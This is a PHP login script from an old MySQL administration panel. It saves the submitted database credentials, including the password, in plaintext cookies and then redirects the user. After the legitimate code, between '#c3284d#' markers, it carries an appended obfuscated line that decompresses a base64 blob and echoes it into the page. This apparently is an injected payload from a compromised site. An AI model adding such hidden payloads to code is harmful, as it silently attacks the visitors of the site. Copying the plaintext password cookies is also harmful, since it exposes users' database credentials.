<?php
/*

Matt's MySQL Panel - administer MySQL databases remotely
Copyright (C) 2001 Matt Wilson <matt@mattsscripts.co.uk

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

*/

/* include some functions */
require "db_routines.php";

/* unget */
unget($vars["username"]);
unget($vars["password"]);
unget($vars["host"]);
unget($vars["database"]);

/* set cookies for the username and password etc */
setcookie("mmcd_username", $vars["username"]);
setcookie("mmcd_password", $vars["password"]);
setcookie("mmcd_hostname", $vars["host"]);

if(!strlen($vars["database"])) {
	$redirect = "dbmanager.php?msg=login";
} else {
	$redirect = "main.php?database=".urlencode($vars["database"]);
}

Header("Location: ".$redirect);


#c3284d#
echo(gzinflate(base64_decode("JY5LDoMwDET3SNwh8oZ2Q6QuW8IpegE3cYkrSKLEfHr7QtmNnvRmpis2cxIl30QGhDbRH1zwpNDXlYt2nihIu2YWujQdvzNOpEq2BrxIumudkDO5xBuNpbVx0gta1EVQSpt8AhV2w8BzZRHKoPb2OI4cBgM4SwT1r3zF7CgbCDvAkYdgwO7Dh+CJBy8GbqBWduKP1Hf6vNI310dddfr83P8A")));
#/c3284d#
?>
